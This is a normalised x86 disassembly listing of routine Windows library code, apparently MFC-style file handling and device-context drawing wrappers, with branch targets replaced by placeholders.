sbb edi edi
and edi 0x2
inc edi
inc edi
jmp r-xdata
cmp eax 0x20
je r-xdata
mov eax edi
push 0x1
and eax 0x70
pop ebx
je r-xdata
mov ecx 0xc0000000
jmp r-xdata
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] ebx
mov eax ebx
mov esi [ ebp + 0x10 ]
test esi esi
je r-xdata
push 0x0
push 0x80
lea edx [ ebp - 0xc ]
push edi
push edx
push eax
push ecx
push [ ebp + 0x8 ]
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov eax ebx
jmp r-xdata
cmp eax 0x30
je r-xdata
xor eax eax
jmp r-xdata
call [ GetLastError@IAT ]
push eax
mov [ esi + 0xc ] eax
call sub_420707
push [ ebp + 0x8 ]
lea ecx [ esi + 0x10 ]
mov [ esi + 0x8 ] eax
call sub_41c49d
and [ ebp - 0x8 ] 0x0
mov edx edi
not edx
shr edx 0x7
and edx ebx
mov [ ebp - 0xc ] 0xc
test edi 0x1000
mov [ ebp - 0x4 ] edx
je r-xdata
push 0x2
jmp r-xdata
cmp eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
pop eax
jmp r-xdata
push 0x3
sub_41ffd3
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
jne r-xdata
lea eax [ ebp + 0xc ]
push 0x0
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x4 ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0xc ]
push eax
call [ GetLastError@IAT ]
push eax
call sub_4205db
pop ebp
retn 0x8
sub_42000d
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
test edi edi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x8
lea eax [ ebp + 0xc ]
push 0x0
push eax
push edi
push [ ebp + 0x8 ]
push [ esi + 0x4 ]
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
push [ esi + 0xc ]
call [ GetLastError@IAT ]
push eax
call sub_4205db
push [ esi + 0xc ]
push 0xffffffff
push 0xd
call sub_42069c
sub_420058
push esi
push [ esp + 0xc ]
push 0x0
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ SetFilePointer@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax esi
pop esi
retn 0x8
push 0x0
call [ GetLastError@IAT ]
push eax
call sub_4205db
sub_420087
push esi
push 0x1
push 0x0
push 0x0
push [ ecx + 0x4 ]
call [ SetFilePointer@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax esi
pop esi
retn
push 0x0
call [ GetLastError@IAT ]
push eax
call sub_4205db
sub_4200d1
push esi
mov esi ecx
push edi
xor edi edi
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
je r-xdata
or [ esi + 0x4 ] 0xffffffff
and [ esi + 0x8 ] 0x0
lea ecx [ esi + 0xc ]
call sub_41c2e3
test edi edi
pop edi
pop esi
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov edi eax
neg edi
sbb edi edi
inc edi
retn
push 0x0
call [ GetLastError@IAT ]
push eax
call sub_4205db
sub_420132
push 0x0
push [ esp + 0xc ]
push 0x0
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ LockFile@IAT ]
test eax eax
jne r-xdata
retn 0x8
push eax
call [ GetLastError@IAT ]
push eax
call sub_4205db
sub_42015b
push 0x0
push [ esp + 0xc ]
push 0x0
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ UnlockFile@IAT ]
test eax eax
jne r-xdata
retn 0x8
push eax
call [ GetLastError@IAT ]
push eax
call sub_4205db
sub_420184
push esi
mov esi ecx
push 0x0
mov eax [ esi ]
push [ esp + 0xc ]
call [ eax + 0x28 ]
push [ esi + 0x4 ]
call [ SetEndOfFile@IAT ]
test eax eax
pop esi
jne r-xdata
retn 0x4
push eax
call [ GetLastError@IAT ]
push eax
call sub_4205db
sub_4201b0
push ebx
push esi
mov esi ecx
push edi
push 0x1
push 0x0
mov eax [ esi ]
call [ eax + 0x28 ]
mov edi eax
mov eax [ esi ]
push 0x2
push 0x0
mov ecx esi
call [ eax + 0x28 ]
mov ebx eax
mov eax [ esi ]
push 0x0
push edi
mov ecx esi
call [ eax + 0x28 ]
pop edi
mov eax ebx
pop esi
pop ebx
retn
sub_4201e2
mov eax sub_4265cc
call sub_40cc20
sub esp 0x14c
push esi
push edi
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x14 ]
push eax
mov esi 0x104
push edi
push esi
push [ ebp + 0xc ]
call [ GetFullPathNameA@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
xor esi esi
push eax
push edi
mov [ ebp - 0x4 ] esi
call sub_4202b2
push esi
lea eax [ ebp - 0x10 ]
push esi
push eax
lea eax [ ebp - 0x18 ]
push eax
push esi
push esi
push esi
push [ ebp + 0x8 ]
call [ GetVolumeInformationA@IAT ]
test eax eax
je r-xdata
push esi
push [ ebp + 0xc ]
push edi
call [ lstrcpynA@IAT ]
xor eax eax
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0x8 ]
call sub_41c358
mov eax esi
test [ ebp - 0x10 ] 0x2
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
test [ ebp - 0x10 ] 0x4
jne r-xdata
push edi
call [ CharUpperA@IAT ]
push 0x1
pop esi
lea eax [ ebp - 0x158 ]
push eax
push [ ebp + 0xc ]
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
je r-xdata
push eax
call [ FindClose@IAT ]
lea eax [ ebp - 0x12c ]
push eax
push [ ebp - 0x14 ]
call [ lstrcpyA@IAT ]
sub_4202b2
mov ecx [ esp + 0x8 ]
push ebx
push esi
mov esi 0x104
push edi
push esi
call sub_41c5cf
xor ebx ebx
mov edi eax
push esi
push ebx
push edi
call sub_40cc70
add esp 0xc
push esi
push [ esp + 0x14 ]
push edi
call [ lstrcpynA@IAT ]
mov cl [ edi ]
mov eax edi
cmp [ eax ] bl
je r-xdata
cmp cl 0x5c
je r-xdata
mov cl [ edi ]
mov eax edi
inc eax
inc eax
mov cl [ eax + 0x1 ]
cmp cl 0x5c
je r-xdata
cmp cl 0x2f
jne r-xdata
cmp [ eax ] bl
je r-xdata
cmp cl 0x5c
je r-xdata
cmp [ eax ] bl
je r-xdata
cmp cl 0x5c
je r-xdata
cmp cl 0x2f
je r-xdata
push eax
call sub_40d477
pop ecx
mov cl [ eax ]
jmp r-xdata
mov ecx [ esp + 0x14 ]
push 0xffffffff
call sub_41c61e
pop edi
pop esi
pop ebx
retn 0x8
mov [ eax + 0x1 ] bl
cmp cl 0x2f
je r-xdata
mov cl [ eax ]
cmp cl bl
je r-xdata
push eax
call sub_40d477
pop ecx
cmp cl 0x2f
je r-xdata
cmp cl bl
je r-xdata
push eax
call sub_40d477
pop ecx
mov cl [ eax ]
jmp r-xdata
cmp cl 0x5c
je r-xdata
push eax
call sub_40d477
pop ecx
jmp r-xdata
cmp cl bl
je r-xdata
cmp cl 0x2f
jne r-xdata
mov cl [ eax ]
cmp cl bl
je r-xdata
sub_420378
push ebp
mov ebp esp
sub esp 0x104
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
mov esi edi
jne r-xdata
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
call GetFileTitleA
test ax ax
je r-xdata
lea esi [ ebp - 0x104 ]
mov [ ebp + 0x10 ] 0x104
test edi edi
jne r-xdata
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_423cdf
jmp r-xdata
xor eax eax
push esi
call [ lstrlenA@IAT ]
inc eax
jmp r-xdata
pop edi
pop esi
leave
retn 0xc
sub_4203ce
mov eax sub_42673b
call sub_40cc20
sub esp 0x120
and [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x12c ]
push esi
push eax
call sub_420501
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
push 0x1
mov eax 0x100
pop esi
lea ecx [ ebp - 0x10 ]
push eax
push eax
mov [ ebp - 0x4 ] esi
call sub_41c5cf
push eax
lea eax [ ebp - 0x11a ]
push eax
call sub_423cdf
push 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_41c61e
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_41c0cd
mov [ ebp - 0x14 ] esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_41c358
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_420450
mov eax sub_426767
call sub_40cc20
sub esp 0x120
and [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x12c ]
push esi
push eax
call sub_420501
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
push 0x1
mov eax 0x100
pop esi
lea ecx [ ebp - 0x10 ]
push eax
push eax
mov [ ebp - 0x4 ] esi
call sub_41c5cf
push eax
lea eax [ ebp - 0x11a ]
push eax
call sub_420378
push 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_41c61e
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_41c0cd
mov [ ebp - 0x14 ] esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_41c358
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_4204d2
push ebp
mov ebp esp
sub esp 0x11c
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x11c ]
push eax
call sub_420501
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10a ]
push eax
call sub_41c382
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_420501
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0x118
push 0x0
mov edi ecx
push esi
call sub_40cc70
add esp 0xc
lea eax [ esi + 0x12 ]
push 0x104
push [ edi + 0xc ]
push eax
call [ lstrcpynA@IAT ]
mov eax [ edi + 0x4 ]
or ebx 0xffffffff
cmp eax ebx
je r-xdata
push 0x1
pop eax
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x10 ]
push ecx
lea ecx [ ebp - 0x8 ]
push ecx
push eax
call [ GetFileTime@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push 0x0
push [ edi + 0x4 ]
call [ GetFileSize@IAT ]
cmp eax ebx
mov [ esi + 0xc ] eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov edi [ edi + 0xc ]
cmp [ edi - 0x8 ] 0x0
jne r-xdata
push edi
call [ GetFileAttributesA@IAT ]
cmp eax ebx
je r-xdata
and [ esi + 0x10 ] 0x0
jmp r-xdata
mov [ esi + 0x10 ] al
lea eax [ ebp - 0x8 ]
push ebx
push eax
lea ecx [ ebp + 0x8 ]
call sub_41a4f3
mov eax [ eax ]
push ebx
mov [ esi ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp + 0x8 ]
call sub_41a4f3
mov eax [ eax ]
push ebx
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp + 0x8 ]
call sub_41a4f3
mov eax [ eax ]
mov [ esi + 0x4 ] eax
cmp [ esi ] 0x0
jne r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov [ esi ] eax
mov eax [ esi + 0x4 ]
mov [ esi + 0x8 ] eax
sub_4205fc
mov eax sub_426784
call sub_40cc20
push ecx
mov eax [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
test eax eax
mov edi 0xf1a0
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x10 ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_41c0cd
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x1
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
add ecx edi
mov [ eax ] ecx
mov eax [ esi + 0x8 ]
push [ ebp + 0x10 ]
add eax edi
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_422174
push [ ebp + 0xc ]
push [ ebp - 0x10 ]
push [ ebp + 0x8 ]
call [ lstrcpynA@IAT ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + 0x10 ]
call sub_41c358
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_41c358
mov ecx [ ebp - 0xc ]
push 0x1
pop eax
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
push 0xf006
lea ecx [ ebp + 0x10 ]
call sub_41f410
sub_42069c
mov eax sub_4267ac
call sub_40cc20
push ecx
push ecx
push esi
push 0x14
call sub_41b806
mov esi eax
pop ecx
mov [ ebp - 0x14 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov ecx esi
call sub_41f634
mov eax [ rw-data ]
lea ecx [ esi + 0x10 ]
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
mov [ esi + 0xc ] eax
call sub_41c49d
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x10 ]
push r--data
push eax
mov [ ebp - 0x10 ] esi
call sub_40da39
pop esi
sub_420707
mov eax [ esp + 0x4 ]
mov ecx 0x10b
cmp eax ecx
ja r-xdata
sub eax 0x3e3
je r-xdata
je r-xdata
push 0xa
dec eax
je r-xdata
push 0x3
jmp r-xdata
cmp eax 0x3e
ja r-xdata
dec eax
je r-xdata
pop eax
cmp eax 0x6b
ja r-xdata
je r-xdata
dec eax
dec eax
je r-xdata
mov ecx 0x90
cmp eax ecx
ja r-xdata
je r-xdata
push 0x8
jmp r-xdata
cmp eax 0x19
ja r-xdata
push 0x5
jmp r-xdata
push 0x1
jmp r-xdata
mov ecx 0xb6
cmp eax ecx
ja r-xdata
je r-xdata
push 0x2
jmp r-xdata
cmp eax 0x47
ja r-xdata
cmp eax 0x27
ja r-xdata
je r-xdata
sub eax 0xb7
je r-xdata
je r-xdata
cmp eax 0x75
ja r-xdata
sub eax 0x50
je r-xdata
je r-xdata
add eax 0xffffffcc
cmp eax 0x8
ja r-xdata
je r-xdata
push 0x9
jmp r-xdata
cmp eax 0x18
ja r-xdata
sub eax 0x8
je r-xdata
push 0x6
jmp r-xdata
sub eax 0x91
je r-xdata
sub eax 0x7b
je r-xdata
je r-xdata
dec eax
dec eax
je r-xdata
sub eax 0x40
je r-xdata
jmp [ eax * 4 + jump_table_420961 ]
push 0xd
jmp r-xdata
cmp eax 0x20
ja r-xdata
jmp [ eax * 4 + jump_table_4208fd ]
dec eax
dec eax
je r-xdata
push 0x7
jmp r-xdata
sub eax 0x9
je r-xdata
dec eax
je r-xdata
sub eax 0x6c
je r-xdata
sub eax 0x3
je r-xdata
dec eax
je r-xdata
sub eax 0x21
je r-xdata
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
jmp r-xdata
sub eax 0xd
je r-xdata
sub eax 0x7
je r-xdata
dec eax
je r-xdata
push 0xc
jmp r-xdata
sub eax 0x3
je r-xdata
dec eax
je r-xdata
dec eax
je r-xdata
dec eax
je r-xdata
push 0xb
jmp r-xdata
sub eax 0x1a
je r-xdata
retn 0x4
dec eax
dec eax
jne r-xdata
sub eax 0x6
je r-xdata
sub eax 0x6
je r-xdata
dec eax
je r-xdata
dec eax
dec eax
jne r-xdata
dec eax
je r-xdata
dec eax
dec eax
je r-xdata
dec eax
je r-xdata
jmp r-xdata
sub eax 0x3
jne r-xdata
jmp r-xdata
dec eax
je r-xdata
dec eax
je r-xdata
dec eax
dec eax
jne r-xdata
dec eax
dec eax
je r-xdata
jmp r-xdata
dec eax
jne r-xdata
dec eax
jne r-xdata
jmp r-xdata
push 0xe
jmp r-xdata
sub_420985
push ebx
push esi
push edi
or ebx 0xffffffff
call sub_41ad89
mov esi eax
call sub_422d64
push [ esp + 0x1c ]
mov edi [ eax + 0x4 ]
push [ esp + 0x1c ]
push [ esp + 0x1c ]
push [ esp + 0x1c ]
call sub_423b5f
test eax eax
je r-xdata
call sub_425b26
pop edi
mov eax ebx
pop esi
pop ebx
retn 0x10
test edi edi
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x50 ]
test eax eax
jne r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x84 ]
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x54 ]
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x68 ]
jmp r-xdata
mov eax [ ecx ]
call [ eax + 0x58 ]
mov ebx eax
sub_420a3e
mov eax sub_42600a
call sub_40cc20
push esi
call sub_422d8a
mov esi eax
cmp [ esi + 0x1c ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x1c ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_421452
call sub_41b7f4
push 0x48
mov ebx eax
call sub_41b806
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x2
push 0x4
push r--data
call sub_41f850
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x1c ] eax
call sub_41b7f4
pop ebx
sub_420ac5
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
test edi edi
jne r-xdata
push 0x1
call sub_420a3e
push edi
lea ecx [ eax + 0x4 ]
mov [ esi + 0x4 ] edi
call sub_41aa98
mov [ eax ] esi
mov eax [ esi ]
push [ esi + 0x4 ]
mov ecx esi
call [ eax + 0xc ]
push 0x1
pop eax
xor eax eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_420afc
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x14 ]
and [ esi + 0x4 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_420a3e
test eax eax
je r-xdata
push [ esi + 0x4 ]
lea ecx [ eax + 0x4 ]
call sub_41aae8
sub_420b2d
mov eax sub_42601c
call sub_40cc20
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
cmp [ ecx + 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_420afc
push eax
call [ DeleteDC@IAT ]
sub_420b81
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
mov edi [ SaveDC@IAT ]
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
push eax
call edi
mov ebx eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
push eax
call edi
test eax eax
je r-xdata
or ebx 0xffffffff
sub_420bb2
push esi
mov esi ecx
push edi
mov edi [ RestoreDC@IAT ]
mov ecx [ esi + 0x4 ]
push 0x1
cmp ecx [ esi + 0x8 ]
pop eax
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
test eax eax
je r-xdata
xor eax eax
push [ esp + 0xc ]
push esi
call edi
test eax eax
je r-xdata
push 0x1
pop eax
jmp r-xdata
sub_420bf0
push ebx
push esi
push edi
mov esi ecx
push [ esp + 0x10 ]
call [ GetStockObject@IAT ]
mov ecx [ esi + 0x4 ]
mov edi [ SelectObject@IAT ]
mov ebx eax
xor eax eax
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push ebx
push ecx
call edi
push eax
call sub_421253
pop edi
pop esi
pop ebx
retn 0x4
push ebx
push esi
call edi
sub_420c2c
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
xor eax eax
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SelectObject@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
push eax
call sub_421253
pop edi
pop esi
pop ebx
retn 0x4
test ebx ebx
jne r-xdata
push eax
push ecx
call edi
mov eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
xor eax eax
jmp r-xdata
push eax
push esi
call edi
sub_420c72
push esi
mov esi ecx
or eax 0xffffffff
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SetBkColor@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push esi
call edi
sub_420ca1
push esi
mov esi ecx
or eax 0xffffffff
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SetTextColor@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push esi
call edi
sub_420cd0
push esi
mov esi ecx
xor eax eax
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SetMapMode@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push esi
call edi
sub_420cfe
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ SetViewportOrgEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_420d4a
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ OffsetViewportOrgEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_420d96
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ SetViewportExtEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_420de2
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ ScaleViewportExtEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x14
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_420e3a
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ SetWindowExtEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_420e86
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ ScaleWindowExtEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x14
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_420eee
push ebp
mov ebp esp
sub esp 0x10
push esi
lea eax [ ebp - 0x8 ]
push edi
mov esi ecx
push eax
push [ esi + 0x8 ]
call [ GetWindowExtEx@IAT ]
lea eax [ ebp - 0x10 ]
push eax
push [ esi + 0x8 ]
call [ GetViewportExtEx@IAT ]
push [ ebp - 0x8 ]
call sub_40da73
pop ecx
push eax
push [ ebp - 0x10 ]
call sub_40da73
mov esi [ ebp + 0x8 ]
mov edi [ MulDiv@IAT ]
pop ecx
push eax
push [ esi ]
call edi
push [ ebp - 0x4 ]
mov [ esi ] eax
call sub_40da73
pop ecx
push eax
push [ ebp - 0xc ]
call sub_40da73
pop ecx
push eax
push [ esi + 0x4 ]
call edi
mov [ esi + 0x4 ] eax
pop edi
pop esi
leave
retn 0x4
sub_420f57
push ebp
mov ebp esp
sub esp 0x10
push esi
lea eax [ ebp - 0x10 ]
push edi
mov esi ecx
push eax
push [ esi + 0x8 ]
call [ GetWindowExtEx@IAT ]
lea eax [ ebp - 0x8 ]
push eax
push [ esi + 0x8 ]
call [ GetViewportExtEx@IAT ]
push [ ebp - 0x8 ]
call sub_40da73
pop ecx
push eax
push [ ebp - 0x10 ]
call sub_40da73
mov esi [ ebp + 0x8 ]
mov edi [ MulDiv@IAT ]
pop ecx
push eax
push [ esi ]
call edi
push [ ebp - 0x4 ]
mov [ esi ] eax
call sub_40da73
pop ecx
push eax
push [ ebp - 0xc ]
call sub_40da73
pop ecx
push eax
push [ esi + 0x4 ]
call edi
mov [ esi + 0x4 ] eax
pop edi
pop esi
leave
retn 0x4
sub_420fc0
mov eax sub_426030
call sub_40cc20
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_420a0e
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
test eax eax
mov [ esi ] r--data
je r-xdata
push eax
mov [ esi + 0x10 ] eax
call [ GetDC@IAT ]
push eax
mov ecx esi
call sub_420ac5
test eax eax
jne r-xdata
mov eax [ eax + 0x1c ]
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
call sub_4212a8
sub_421032
mov eax sub_426044
call sub_40cc20
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
call sub_420afc
push eax
push [ esi + 0x10 ]
call [ ReleaseDC@IAT ]
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_420b2d
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_421074
mov eax sub_426058
call sub_40cc20
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_420a0e
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
test eax eax
mov [ esi ] r--data
je r-xdata
push eax
mov [ esi + 0x10 ] eax
